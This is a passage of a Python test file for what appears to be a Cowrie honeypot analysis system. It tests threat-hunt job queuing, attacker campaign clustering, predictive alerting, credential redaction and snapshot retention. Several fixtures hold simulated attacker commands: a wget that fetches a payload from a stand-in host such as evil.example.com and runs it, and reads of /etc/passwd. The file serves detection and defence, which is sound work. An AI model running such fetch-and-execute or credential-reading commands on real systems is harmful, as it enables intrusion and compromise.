        assert alert_payload["severity"] == "HIGH"
        jobs = storage.list_rows("threat_hunt_jobs")
        assert jobs[0]["status"] == "succeeded"
        result = json.loads(jobs[0]["result_json"])
        assert result["related_session_count"] == 1
        assert result["alerts_created"] == 1


def test_session_worker_enqueues_threat_hunt_jobs_on_session_close() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        base = {
            "session": "hunt-source",
            "src_ip": "8.8.8.8",
            "timestamp": "2026-05-12T00:00:00Z",
            "sensor": "unit-sensor",
        }
        for event in [
            {**base, "eventid": "cowrie.login.success", "username": "root", "password": "secret-pass"},
            {**base, "eventid": "cowrie.command.input", "input": "wget http://evil.example.com/payload.sh"},
            {**base, "eventid": "cowrie.session.closed", "duration": 3.2},
        ]:
            storage.store_event(cfg.sensor_id, event)

        worker = SessionWorker(cfg)
        assert worker.process_unprocessed() == 3

        jobs = storage.list_rows("threat_hunt_jobs")
        observables = {(row["observable_type"], row["observable_value"]) for row in jobs}
        assert ("ip", "8.8.8.8") in observables
        assert ("url", "http://evil.example.com/payload.sh") in observables
        sessions = storage.list_rows("sessions")
        payload = json.loads(sessions[0]["payload_json"])
        assert payload["threat_hunt_enqueue"]["candidates"] >= 2


def test_threat_hunt_worker_backfills_existing_closed_sessions() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.save_session(
            {
                "session_id": "old-closed",
                "src_ip": "8.8.8.8",
                "sensor": "unit-sensor",
                "is_ended": True,
                "commands": ["wget http://old.example.com/payload.sh"],
                "ioc_summary": {"urls": [{"value": "http://old.example.com/payload.sh"}]},
            }
        )
        worker = ThreatHuntWorker(cfg)
        summary = worker.enqueue_existing_sessions(limit=10)
        assert summary["sessions_seen"] == 1
        assert summary["jobs_queued"] >= 1
        jobs = storage.list_rows("threat_hunt_jobs")
        assert any(row["observable_value"] == "http://old.example.com/payload.sh" for row in jobs)


def test_campaign_clustering_builds_stable_behavior_fingerprint() -> None:
    payload = {
        "session_id": "campaign-fp-1",
        "src_ip": "203.0.113.10",
        "hassh": "abc123hassh",
        "commands": [
            "wget http://evil.example.com/payload.sh -O /tmp/p.sh",
            "chmod +x /tmp/p.sh",
            "/tmp/p.sh",
        ],
        "classification_events": [
            {"command": "wget http://evil.example.com/payload.sh -O /tmp/p.sh", "ttp": "T1105", "tactic": "command-and-control"},
            {"command": "chmod +x /tmp/p.sh", "ttp": "T1059", "tactic": "execution"},
            {"command": "/tmp/p.sh", "ttp": "T1059", "tactic": "execution"},
        ],
    }
    fp1 = build_session_fingerprint(payload)
    fp2 = build_session_fingerprint({**payload, "session_id": "campaign-fp-2"})
    assert fp1["hassh_fingerprint"]
    assert fp1["command_pattern_hash"]
    assert fp1["tactic_sequence_hash"]
    assert fp1["primary_fingerprint_type"] == "hassh_fingerprint"
    assert fp1["hassh_fingerprint"] == fp2["hassh_fingerprint"]
    assert fp1["command_pattern_hash"] == fp2["command_pattern_hash"]
    assert fp1["confirmed_tactics"] == ["command-and-control", "execution"]


def test_campaign_clustering_links_returning_actor_and_alerts_high_severity() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        policy = {
            **cfg.campaign_policy,
            "known_actor_min_prior_severity": "high",
            "min_match_score": 0.2,
        }
        first = {
            "session_id": "campaign-first",
            "src_ip": "203.0.113.10",
            "hassh": "same-hassh",
            "updated_at": "2026-05-13T10:00:00Z",
            "is_ended": True,
            "commands": ["wget http://evil.example.com/payload.sh -O /tmp/p.sh"],
            "classification_events": [
                {"command": "wget http://evil.example.com/payload.sh -O /tmp/p.sh", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0}
            ],
        }
        first_summary = create_or_update_campaign(storage, first, policy, status="closed")
        assert first_summary["status"] == "created"
        assert first_summary["known_actor_return_alert_id"] == ""

        second = {
            "session_id": "campaign-return",
            "src_ip": "198.51.100.20",
            "hassh": "same-hassh",
            "updated_at": "2026-05-13T10:05:00Z",
            "commands": ["whoami"],
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "confidence": 1.0}
            ],
        }
        second_summary = create_or_update_campaign(storage, second, policy, status="active")
        assert second_summary["status"] == "matched"
        assert second_summary["campaign_id"] == first_summary["campaign_id"]
        assert second_summary["prior_other_session_count"] == 1
        assert second_summary["known_actor_return_alert_id"]
        links = storage.list_session_campaigns("campaign-return")
        assert links and links[0]["campaign_id"] == first_summary["campaign_id"]
        alerts = storage.list_rows("alerts", limit=10)
        alert_payloads = [json.loads(row["payload_json"]) for row in alerts]
        assert any(payload.get("alert_type") == "known_actor_return" for payload in alert_payloads)
        third = {
            **second,
            "session_id": "campaign-backfill-style",
            "src_ip": "198.51.100.21",
        }
        quiet_summary = create_or_update_campaign(storage, third, policy, status="closed", emit_alerts=False)
        assert quiet_summary["status"] == "matched"
        assert quiet_summary["known_actor_return_alert_id"] == ""
        assert len(storage.list_rows("alerts", limit=10)) == len(alerts)


def test_session_worker_stores_campaign_summary_on_closed_session() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        base = {
            "session": "campaign-worker-1",
            "src_ip": "198.51.100.77",
            "timestamp": "2026-05-13T10:00:00Z",
            "sensor": "unit-sensor",
        }
        events = [
            {**base, "eventid": "cowrie.login.success", "username": "root", "password": "secret"},
            {**base, "eventid": "cowrie.command.input", "input": "wget http://evil.example.com/payload.sh -O /tmp/p.sh"},
            {**base, "eventid": "cowrie.command.input", "input": "chmod +x /tmp/p.sh"},
            {**base, "eventid": "cowrie.session.closed", "duration": 5.0},
        ]
        for event in events:
            storage.store_event("unit-sensor", event)
        worker = SessionWorker(cfg)
        assert worker.process_unprocessed() == len(events)
        row = storage.get_session("campaign-worker-1")
        assert row
        payload = row["payload"]
        assert payload["campaign_summary"]["status"] in {"created", "matched"}
        assert payload["campaign_summary"]["campaign_id"]
        assert storage.list_session_campaigns("campaign-worker-1")


def test_monitor_renders_campaign_panel() -> None:
    html = _render_campaign_panel(
        {
            "ok": True,
            "session_id": "campaign-return",
            "session_payload": {
                "campaign_summary": {
                    "status": "matched",
                    "campaign_id": "campaign_abc",
                    "matched_existing_campaign": True,
                    "campaign_session_count": 2,
                    "prior_other_session_count": 1,
                    "max_confirmed_severity": "high",
                    "known_actor_return_alert_id": "alert_1",
                    "fingerprint": {
                        "primary_fingerprint_type": "hassh_fingerprint",
                        "primary_fingerprint_value": "deadbeef",
                    },
                    "matches": [{"match_reasons": ["matched hassh_fingerprint"]}],
                }
            },
            "campaigns": [
                {
                    "campaign_id": "campaign_abc",
                    "session_count": 2,
                    "max_confirmed_severity": "high",
                    "primary_fingerprint_type": "hassh_fingerprint",
                    "primary_fingerprint_value": "deadbeef",
                    "confirmed_tactics": ["command-and-control"],
                    "payload": {"fingerprint": {"hassh_fingerprint": "deadbeef"}},
                }
            ],
            "campaign_memberships": [
                {
                    "campaign_id": "campaign_abc",
                    "confidence": 0.9,
                    "match_reasons": ["matched hassh_fingerprint"],
                    "created_at": "2026-05-13T10:00:00Z",
                }
            ],
            "errors": {},
        }
    )
    assert "Campaign Membership Evidence" in html
    assert "campaign_abc" in html
    assert "matched hassh_fingerprint" in html
    assert "known_actor_alert" in html


def test_session_close_creates_exactly_one_analysis_job_and_redacts_credentials() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        # This workflow characterization exercises the retained legacy
        # fallback path, not the manifest-bound production policy.
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "prediction_mode": "primary_transition_with_fallback",
            "compute_weighted_ensemble_baseline": False,
            "weight_influence_scope": "diagnostic_only",
            "primary_transition": {
                "primary_model": "transition_frequency",
                "source_order": ["local_transition", "external_seed_transition"],
                "fallback_scorer": "fallback_progression",
                "min_transition_score": 0.01,
            },
        }
        storage = open_storage(cfg.database_url)
        for event in _demo_events():
            storage.store_event(cfg.sensor_id, event)

        worker = SessionWorker(cfg)
        assert worker.process_unprocessed() == 4
        assert worker.process_unprocessed() == 0

        jobs = storage.list_rows("analysis_jobs")
        assert len(jobs) == 1
        assert jobs[0]["status"] == "queued"
        snapshots = storage.list_rows("prediction_snapshots")
        assert len(snapshots) == 3
        latest_snapshot = json.loads(snapshots[0]["payload_json"])
        assert latest_snapshot["session_id"] == "sess-1"
        assert latest_snapshot["prediction"]
        assert latest_snapshot["prediction_trigger"]["eventid"] == "cowrie.session.closed"
        observable_sightings = storage.list_rows("observable_sightings")
        assert any(row["observable_type"] == "ip" and row["observable_value"] == "8.8.8.8" for row in observable_sightings)
        observables = storage.list_rows("observables")
        assert any(row["observable_type"] == "ip" and row["observable_value"] == "8.8.8.8" for row in observables)
        enrichment_jobs = storage.list_rows("enrichment_jobs")
        assert any(job["observable_type"] == "ip" and job["observable_value"] == "8.8.8.8" for job in enrichment_jobs)

        sessions = storage.list_rows("sessions")
        assert len(sessions) == 1
        payload = json.loads(sessions[0]["payload_json"])
        serialized = json.dumps(payload)
        assert payload["is_ended"] is True
        assert payload["session_outcome"] == "completed"
        assert payload["login_password"] == "[REDACTED]"
        assert payload["login_password_hash"].startswith("hmac-sha256-v1:unit-test-key:")
        assert "secret-pass" not in serialized


def test_session_worker_persists_redacted_attacker_controlled_session_strings() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        marker = "persisted-session-boundary-probe"
        username_marker = "opaque-login-username-probe"
        base = {
            "session": "persisted-redaction",
            "src_ip": "203.0.113.12",
            "timestamp": "2026-07-18T00:00:00Z",
            "sensor": cfg.sensor_id,
        }
        events = [
            {**base, "eventid": "cowrie.session.connect"},
            {
                **base,
                "eventid": "cowrie.client.version",
                "version": f"password={marker}",
            },
            {
                **base,
                "eventid": "cowrie.login.success",
                "username": username_marker,
                "password": marker,
            },
            {
                **base,
                "eventid": "cowrie.command.input",
                "input": f"sshpass -p {marker} ssh analyst@example.invalid",
            },
            {
                **base,
                "eventid": "cowrie.session.closed",
                "duration": 1.0,
            },
        ]
        for event in events:
            storage.store_event(cfg.sensor_id, event)

        assert SessionWorker(cfg).process_unprocessed() == len(events)

        rows = storage.list_rows("sessions")
        assert len(rows) == 1
        payload = json.loads(rows[0]["payload_json"])
        encoded = json.dumps(payload, sort_keys=True)
        assert marker not in encoded
        assert username_marker not in encoded
        assert "[REDACTED]" in payload["client_version"]
        assert "[REDACTED]" in payload["login_username"]
        assert payload["login_password_hash"].startswith(
            "hmac-sha256-v1:unit-test-key:"
        )
        snapshots = storage.list_rows("prediction_snapshots")
        assert snapshots
        assert marker not in json.dumps(snapshots, sort_keys=True)
        assert username_marker not in json.dumps(snapshots, sort_keys=True)


def test_session_worker_skips_prediction_for_non_behavior_events() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        base = {
            "session": "trigger-session",
            "src_ip": "8.8.8.8",
            "timestamp": "2026-05-12T00:00:00Z",
            "sensor": "unit-sensor",
        }
        for event in [
            {**base, "eventid": "cowrie.session.connect", "src_port": 55000},
            {**base, "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh"},
            {**base, "eventid": "cowrie.session.params", "arch": "linux-x64-lsb"},
            {**base, "eventid": "cowrie.command.input", "input": "whoami"},
        ]:
            storage.store_event(cfg.sensor_id, event)

        worker = SessionWorker(cfg)
        assert worker.process_unprocessed() == 4

        snapshots = storage.list_rows("prediction_snapshots")
        assert len(snapshots) == 1
        payload = json.loads(snapshots[0]["payload_json"])
        assert payload["prediction_trigger"]["eventid"] == "cowrie.command.input"
        assert payload["prediction_trigger"]["match_type"] == "eventid_prefix"


def test_session_worker_can_disable_prediction_trigger_filter() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "prediction_triggers": {"enabled": False},
        }
        storage = open_storage(cfg.database_url)
        base = {
            "session": "trigger-disabled",
            "src_ip": "8.8.8.8",
            "timestamp": "2026-05-12T00:00:00Z",
            "sensor": "unit-sensor",
        }
        for event in [
            {**base, "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh"},
            {**base, "eventid": "cowrie.session.params", "arch": "linux-x64-lsb"},
            {**base, "eventid": "cowrie.command.input", "input": "whoami"},
        ]:
            storage.store_event(cfg.sensor_id, event)

        worker = SessionWorker(cfg)
        assert worker.process_unprocessed() == 3

        snapshots = storage.list_rows("prediction_snapshots")
        assert len(snapshots) == 3
        payload = json.loads(snapshots[0]["payload_json"])
        assert payload["prediction_trigger"]["filter_enabled"] is False


def test_session_worker_uses_local_transition_history_when_available() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.prediction_policy = {
            "enabled": True,
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_tactic_transition_count": 1,
            "transition_history_limit": 100,
            "weights": {
                "local_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "enrichment_context": 0.0,
            },
        }
        storage = open_storage(cfg.database_url)
        storage.save_session(
            {
                "session_id": "history-c2",
                "src_ip": "8.8.4.4",
                "session_source": "production_live",
                "is_ended": True,
                "status": "closed",
                "classification_events": [
                    {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access"},
                    {"command": "wget http://example/p.sh", "ttp": "T1105", "tactic": "command-and-control"},
                ],
            }
        )
        storage.store_event(
            cfg.sensor_id,
            {
                "eventid": "cowrie.command.input",
                "session": "active-local",
                "src_ip": "8.8.8.8",
                "timestamp": "2026-05-12T00:00:00Z",
                "input": "cat /etc/passwd",
            },
        )

        worker = SessionWorker(cfg)
        class FakeMitre:
            def get_tactics(self, tid):
                return {"T1003": ["credential-access"], "T1105": ["command-and-control"]}.get(tid, [])

            def get_name(self, tid):
                return tid

        worker.mitre_db = FakeMitre()
        worker.classifier = NotebookParityClassifier(mitre_db=worker.mitre_db)
        worker.monitor = worker._new_monitor()
        assert worker.process_unprocessed() == 1

        snapshot = json.loads(storage.list_rows("prediction_snapshots")[0]["payload_json"])
        assert snapshot["session_id"] == "active-local"
        assert snapshot["prediction"][0] == "command-and-control"
        assert snapshot["final_ranking"][0]["sources"][0]["name"] == "local_transition"


def test_session_worker_stores_smb_decision_and_high_risk_alert() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.enable_smb_decisions = True
        cfg.enable_smb_decision_alerts = True
        cfg.smb_alert_min_severity = "high"
        storage = open_storage(cfg.database_url)
        storage.store_event(
            cfg.sensor_id,
            {
                "eventid": "cowrie.command.input",
                "session": "smb-alert-session",
                "src_ip": "203.0.113.45",
                "dst_port": 22,
                "protocol": "ssh",
                "timestamp": "2026-05-12T00:00:00Z",
                "input": "cat /etc/passwd",
            },
        )

        worker = SessionWorker(cfg)

        class FakeMitre:
            def get_tactics(self, tid):
                return {"T1003": ["credential-access"]}.get(tid, [])

            def get_name(self, tid):
                return tid

        worker.mitre_db = FakeMitre()
        worker.classifier = NotebookParityClassifier(mitre_db=worker.mitre_db)
        worker.monitor = worker._new_monitor()
        assert worker.process_unprocessed() == 1

        snapshot = json.loads(storage.list_rows("prediction_snapshots")[0]["payload_json"])
        assert snapshot["smb_decision"]["risk"]["severity"] == "high"
        assert any(
            item["action_id"] == "rotate-affected-credentials"
            and "rotate only credentials confirmed exposed or reused" in item["action"]
            for item in snapshot["smb_decision"]["immediate_actions"]
        )
        alerts = storage.list_rows("alerts")
        alert_payloads = [json.loads(row["payload_json"]) for row in alerts]
        assert any(payload.get("alert_type") == "smb_decision" for payload in alert_payloads)


def test_predictive_alert_policy_creates_alert_for_high_risk_prediction() -> None:
    snapshot = {
        "snapshot_id": "pred-alert-unit",
        "session_id": "pred-alert-session",
        "src_ip": "203.0.113.20",
        "session_status": "active",
        "event_id": "evt-unit",
        "coverage": {"active_scorer_count": 2, "below_minimum": False},
        "agreement": {"divergence_ratio": 0.0},
        "trust_status": {"status": "nominal"},
        "classification_quality": {"validation_status": "available"},
        "final_ranking": [
            {
                "tactic": "command-and-control",
                "confidence": "high",
                "calibrated_score": 0.81,
                "reasons": ["local transition evidence supports command-and-control"],
                "support": {
                    "supporting_scorer_count": 2,
                    "supporting_scorers": ["local_transition", "sigma_correlation"],
                    "external_seed_only": False,
                    "context_only": False,
                },
                "sources": [
                    {"name": "local_transition", "source_type": "empirical_local"},
                    {"name": "sigma_correlation", "source_type": "detection_correlation"},
                ],
            }
        ],
    }
    alert, evaluation = evaluate_predictive_alert(
        snapshot,
        {
            "policy_metadata": {"policy_id": "unit-policy"},
            "predictive_alerts": {
                "enabled": True,
                "min_confidence": "medium",
                "min_score": 0.5,
                "min_severity": "high",
                "min_active_scorers": 2,
                "alert_on_session_status": ["active"],
            },
        },
    )

    assert alert is not None
    assert evaluation["status"] == "alert_created"
    assert alert["alert_type"] == "predictive_next_step"
    assert alert["severity"] == "HIGH"
    assert alert["predicted_tactic"] == "command-and-control"
    assert alert["payload"]["policy_id"] == "unit-policy"


def test_predictive_alert_policy_keeps_risk_annotation_informational_by_default() -> None:
    snapshot = {
        "snapshot_id": "pred-alert-risk-annotation",
        "session_id": "pred-alert-risk-annotation",
        "src_ip": "203.0.113.20",
        "session_status": "active",
        "coverage": {"active_scorer_count": 2, "below_minimum": False},
        "agreement": {"divergence_ratio": 0.0},
        "risk_annotation": {
            "active": True,
            "level": "high",
            "score": 0.55,
            "excluded_from_tactic_ranking": True,
        },
        "final_ranking": [
            {
                "tactic": "command-and-control",
                "confidence": "high",
                "calibrated_score": 0.81,
                "support": {
                    "supporting_scorer_count": 2,
                    "supporting_scorers": ["local_transition", "sigma_correlation"],
                    "external_seed_only": False,
                    "context_only": False,
                },
                "sources": [
                    {"name": "local_transition", "source_type": "empirical_local"},
                    {"name": "sigma_correlation", "source_type": "detection_correlation"},
                ],
            }
        ],
    }
    alert, evaluation = evaluate_predictive_alert(
        snapshot,
        {
            "policy_metadata": {"policy_id": "unit-policy"},
            "predictive_alerts": {
                "enabled": True,
                "min_confidence": "medium",
                "min_score": 0.5,
                "min_severity": "high",
                "min_active_scorers": 2,
                "alert_on_session_status": ["active"],
            },
        },
    )
    assert alert is not None
    assert alert["severity"] == "HIGH"
    assert alert["predicted_score"] == 0.81
    assert evaluation["candidate"]["base_severity"] == "high"
    assert evaluation["candidate"]["risk_severity_adjustment"]["applied"] is False
    assert evaluation["candidate"]["risk_severity_adjustment"]["reason"] == "risk annotation severity boost disabled"
    assert alert["payload"]["risk_annotation"]["excluded_from_tactic_ranking"] is True


def test_predictive_alert_policy_suppresses_closed_session_prediction() -> None:
    alert, evaluation = evaluate_predictive_alert(
        {
            "snapshot_id": "pred-alert-closed",
            "session_id": "pred-alert-closed",
            "session_status": "closed",
            "coverage": {"active_scorer_count": 2, "below_minimum": False},
            "agreement": {"divergence_ratio": 0.0},
            "final_ranking": [
                {"tactic": "exfiltration", "confidence": "high", "score": 0.9}
            ],
        },
        {"predictive_alerts": {"enabled": True, "alert_on_session_status": ["active"]}},
    )

    assert alert is None
    assert evaluation["status"] == "suppressed"
    assert "outside predictive alert scope" in evaluation["reason"]


def test_predictive_alert_policy_suppresses_weakly_supported_high_risk_prediction() -> None:
    alert, evaluation = evaluate_predictive_alert(
        {
            "snapshot_id": "pred-alert-weak",
            "session_id": "pred-alert-weak",
            "session_status": "active",
            "coverage": {"active_scorer_count": 2, "below_minimum": False},
            "agreement": {"divergence_ratio": 0.0},
            "final_ranking": [
                {
                    "tactic": "command-and-control",
                    "confidence": "high",
                    "score": 0.8,
                    "support": {
                        "supporting_scorer_count": 1,
                        "supporting_scorers": ["external_seed_transition"],
                        "external_seed_only": True,
                    },
                }
            ],
        },
        {
            "predictive_alerts": {
                "enabled": True,
                "min_confidence": "medium",
                "min_score": 0.5,
                "min_severity": "high",
                "min_active_scorers": 2,
                "min_supporting_scorers": 2,
                "alert_on_session_status": ["active"],
            }
        },
    )

    assert alert is None
    assert evaluation["status"] == "suppressed"
    assert "supporting scorer" in evaluation["reason"]


def test_predictive_alert_policy_suppresses_high_divergence() -> None:
    alert, evaluation = evaluate_predictive_alert(
        {
            "snapshot_id": "pred-alert-divergent",
            "session_id": "pred-alert-divergent",
            "session_status": "active",
            "coverage": {"active_scorer_count": 3, "below_minimum": False},
            "agreement": {"divergence_ratio": 0.8},
            "final_ranking": [
                {
                    "tactic": "command-and-control",
                    "confidence": "high",
                    "score": 0.8,
                    "support": {
                        "supporting_scorer_count": 2,
                        "supporting_scorers": ["local_transition", "sigma_correlation"],
                    },
                }
            ],
        },
        {"predictive_alerts": {"enabled": True, "max_divergence_ratio": 0.5}},
    )

    assert alert is None
    assert evaluation["status"] == "suppressed"
    assert "divergence ratio" in evaluation["reason"]


def test_session_worker_suppresses_prediction_only_alert_and_enrichment() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.enable_smb_decisions = False
        cfg.enable_smb_decision_alerts = False
        cfg.prediction_policy = {
            **cfg.prediction_policy,
            "prediction_mode": "primary_transition_with_fallback",
            "compute_weighted_ensemble_baseline": False,
            "weight_influence_scope": "diagnostic_only",
            "primary_transition": {
                "primary_model": "transition_frequency",
                "source_order": ["local_transition", "external_seed_transition"],
                "fallback_scorer": "fallback_progression",
                "min_transition_score": 0.01,
            },
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_prefix_transition_count": 1,
            "min_technique_transition_count": 1,
            "min_tactic_transition_count": 1,
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 1.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "predictive_alerts": {
                "enabled": True,
                "min_confidence": "low",
                "min_score": 0.01,
                "min_severity": "high",
                "min_active_scorers": 1,
                "min_supporting_scorers": 1,
                "block_on_coverage_below_minimum": False,
                "alert_on_session_status": ["active"],
            },
        }
        storage = open_storage(cfg.database_url)
        storage.initialize()
        storage.save_session(
            {
                "session_id": "pred-alert-history",
                "src_ip": "8.8.8.8",
                "session_source": "production_live",
                "is_ended": True,
                "classification_events": [
                    {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access", "confidence": 1.0},
                    {"command": "wget http://example/p.sh", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0},
                ],
            }
        )
        storage.store_event(
            cfg.sensor_id,
            {
                "eventid": "cowrie.command.input",
                "session": "pred-alert-live",
                "src_ip": "203.0.113.21",
                "timestamp": "2026-05-12T00:00:00Z",
                "input": "cat /etc/passwd",
            },
        )

        worker = SessionWorker(cfg)

        class FakeMitre:
            def get_tactics(self, tid):
                return {"T1003": ["credential-access"], "T1105": ["command-and-control"]}.get(tid, [])

            def get_name(self, tid):
                return tid

        worker.mitre_db = FakeMitre()
        worker.classifier = NotebookParityClassifier(mitre_db=worker.mitre_db)
        worker.monitor = worker._new_monitor()
        assert worker.process_unprocessed() == 1

        snapshot = json.loads(storage.list_rows("prediction_snapshots")[0]["payload_json"])
        assert snapshot["predictive_alert"]["status"] == "suppressed"
        assert snapshot["predictive_alert"]["candidate"]["predicted_tactic"] == "command-and-control"
        assert snapshot["predictive_alert"]["legacy_candidate_thresholds_crossed"] is True
        assert snapshot["predictive_alert"]["authority"] == {
            "prediction_only": True,
            "may_create_alert": False,
            "may_escalate_enrichment": False,
            "semantics": "diagnostic_threshold_evaluation_only",
        }
        alert_payloads = [json.loads(row["payload_json"]) for row in storage.list_rows("alerts")]
        predictive_alerts = [payload for payload in alert_payloads if payload.get("alert_type") == "predictive_next_step"]
        assert predictive_alerts == []
        assert snapshot["predictive_alert"]["enrichment_escalation"] == {
            "status": "prohibited",
            "reason": "prediction alone cannot escalate enrichment",
        }
        enrichment_jobs = storage.list_rows("enrichment_jobs")
        ip_jobs = [job for job in enrichment_jobs if job["observable_value"] == "203.0.113.21"]
        assert all(
            "predictive_alert" not in (job["priority_reason"] or "")
            for job in ip_jobs
        )


def test_session_worker_discards_forged_prediction_alert_payload() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.initialize()
        worker = SessionWorker(cfg)
        forged_alert = {
            "alert_id": "forged-predictive-alert",
            "alert_type": "predictive_next_step",
            "session_id": "forged-session",
            "severity": "CRITICAL",
            "predicted_tactic": "impact",
        }
        forged_evaluation = {
            "schema_version": "predictive_alert_evaluation.v1",
            "status": "alert_created",
            "reason": "forged permissive overlay",
            "alert_id": "forged-predictive-alert",
            "candidate": {"predicted_tactic": "impact"},
            "suppressed_reasons": [],
        }
        snapshot = {
            "snapshot_id": "forged-snapshot",
            "session_id": "forged-session",
            "src_ip": "203.0.113.99",
        }

        with patch(
            "production.workers.session_worker.evaluate_predictive_alert",
            return_value=(forged_alert, forged_evaluation),
        ):
            worker._maybe_store_predictive_alert(snapshot)

        assert storage.list_rows("alerts") == []
        assert storage.list_rows("enrichment_jobs") == []
        assert snapshot["predictive_alert"]["status"] == "suppressed"
        assert "alert_id" not in snapshot["predictive_alert"]
        assert snapshot["predictive_alert"]["authority"][
            "may_create_alert"
        ] is False
        assert snapshot["predictive_alert"]["authority"][
            "may_escalate_enrichment"
        ] is False


def test_storage_returns_latest_prediction_snapshot_for_session() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "older-snapshot",
                "session_id": "latest-pred-session",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "evt-old",
                "features_hash": "features-old",
                "generated_at": "2026-05-12T00:00:00+00:00",
                "prediction": ["discovery"],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "newer-snapshot",
                "session_id": "latest-pred-session",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "evt-new",
                "features_hash": "features-new",
                "generated_at": "2026-05-12T00:00:01+00:00",
                "prediction": ["persistence"],
            }
        )
        latest = storage.get_latest_prediction_snapshot("latest-pred-session")
        assert latest is not None
        assert latest["snapshot_id"] == "newer-snapshot"
        assert latest["payload"]["prediction"] == ["persistence"]


def test_storage_prunes_old_intermediate_prediction_snapshots() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "old-intermediate",
                "session_id": "retention-a",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "evt-old",
                "features_hash": "old",
                "generated_at": "2026-01-01T00:00:00+00:00",
                "prediction": ["discovery"],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "new-latest",
                "session_id": "retention-a",
                "src_ip": "8.8.8.8",
                "session_status": "active",
                "event_id": "evt-new",
                "features_hash": "new",
                "generated_at": "2026-05-20T00:00:00+00:00",
                "prediction": ["execution"],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "old-only-latest",
                "session_id": "retention-b",
                "src_ip": "8.8.4.4",
                "session_status": "active",
                "event_id": "evt-old-only",
                "features_hash": "old-only",
                "generated_at": "2026-01-01T00:00:00+00:00",
                "prediction": ["credential-access"],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "old-feedback-linked",
                "session_id": "retention-c",
                "src_ip": "1.1.1.1",
                "session_status": "active",
                "event_id": "evt-feedback",
                "features_hash": "feedback",
                "generated_at": "2026-01-01T00:00:00+00:00",
                "prediction": ["persistence"],
            }
        )
        storage.record_analyst_feedback(
            {
                "session_id": "retention-c",
                "snapshot_id": "old-feedback-linked",
                "label": "useful",
            }
        )
        result = storage.prune_prediction_snapshots(
            retention_days=90,
            keep_latest_per_session=True,
            now="2026-05-21T00:00:00+00:00",
            dry_run=False,
        )
        remaining = {row["snapshot_id"] for row in storage.list_rows("prediction_snapshots", limit=20)}
        assert result["deleted"] == 1
        assert "old-intermediate" not in remaining
        assert {"new-latest", "old-only-latest", "old-feedback-linked"}.issubset(remaining)


def test_dashboard_current_prediction_payload_includes_trust_summary() -> None:
    snapshot = {
        "snapshot_id": "api-snapshot",
        "session_id": "api-session",
        "created_at": "2026-05-12T00:00:00+00:00",
        "payload": {
            "snapshot_id": "api-snapshot",
            "session_id": "api-session",
            "generated_at": "2026-05-12T00:00:00+00:00",
            "prediction": ["persistence"],
            "final_ranking": [
                {
                    "tactic": "persistence",
                    "score": 0.6,
                    "sources": [
                        {"name": "local_transition", "source_type": "empirical_local", "weighted_score": 0.4},
                        {"name": "tactic_combination", "source_type": "heuristic_prior", "weighted_score": 0.2},
                    ],
                }
            ],
            "local_transition_model": {"maturity": "warming"},
            "external_seed_model": {"enabled": True},
            "classification_quality": {"validation_status": "available"},
            "calibration_status": {"status": "disabled"},
            "trust_status": {"evidence_posture": "local_dominated"},
            "agreement": {"disagreement": False},
            "prediction_trigger": {"eventid": "cowrie.command.input", "filter_enabled": True},
        },
    }
    payload = _current_prediction_payload(snapshot, [{"label": "useful", "created_at": "2026-05-12T00:00:01+00:00"}])
    assert payload["prediction"] == ["persistence"]
    assert payload["source_breakdown"]["local_transition"]["weighted_score_sum"] == 0.4
    assert payload["local_transition_model"]["maturity"] == "warming"
    assert payload["classification_quality"]["validation_status"] == "available"
    assert payload["prediction_trigger"]["eventid"] == "cowrie.command.input"
    assert payload["feedback_summary"]["labels"]["useful"] == 1


def test_storage_records_backtest_runs_and_analyst_feedback() -> None:
    with tempfile.TemporaryDirectory() as tmp:
